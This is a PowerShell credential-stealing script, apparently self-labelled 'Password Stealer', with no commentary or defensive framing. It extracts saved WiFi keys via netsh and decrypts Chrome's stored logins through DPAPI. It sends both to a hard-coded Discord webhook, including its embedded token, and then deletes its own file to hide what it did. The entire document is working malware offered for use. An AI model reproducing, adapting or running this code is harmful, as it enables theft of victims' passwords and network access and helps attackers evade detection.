# Discord Webhook
$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"

# Get computer info
$pc = "$env:COMPUTERNAME | $env:USERNAME"

# === WiFi Passwords ===
$wifi = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$")
    if($pass) {
        $p = $pass.Matches.Groups[1].Value.Trim()
        "$name : $p"
    }
} | Out-String

# === Chrome Passwords ===
$chrome = ""
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if(Test-Path $chromePath) {
    try {
        $tempDb = "$env:TEMP\chrome_$(Get-Random).db"
        Copy-Item $chromePath $tempDb -Force
        
        Add-Type -AssemblyName System.Security
        
        # Using COM object to read SQLite (works without external DLL)
        $conn = New-Object -ComObject ADODB.Connection
        $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;")
        $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
        
        while(-not $rs.EOF) {
            $url = $rs.Fields.Item("origin_url").Value
            $user = $rs.Fields.Item("username_value").Value
            $encPass = $rs.Fields.Item("password_value").Value
            
            if($encPass) {
                try {
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    $chrome += "$url`n  User: $user`n  Pass: $password`n`n"
                } catch {}
            }
            $rs.MoveNext()
        }
        
        $conn.Close()
        Remove-Item $tempDb -Force
    } catch {
        $chrome = "Chrome: Could not decrypt (browser may be open or newer Chrome version)"
    }
} else {
    $chrome = "Chrome: Not installed"
}

# === Format output ===
$output = @"
**PC: $pc**

**=== WiFi Networks ===**
$wifi

**=== Chrome Passwords ===**
$chrome
"@

# === Send to Discord ===
$body = @{
    content = $output
    username = "Password Stealer"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'

# Clean up
Remove-Item $MyInvocation.MyCommand.Path -Force
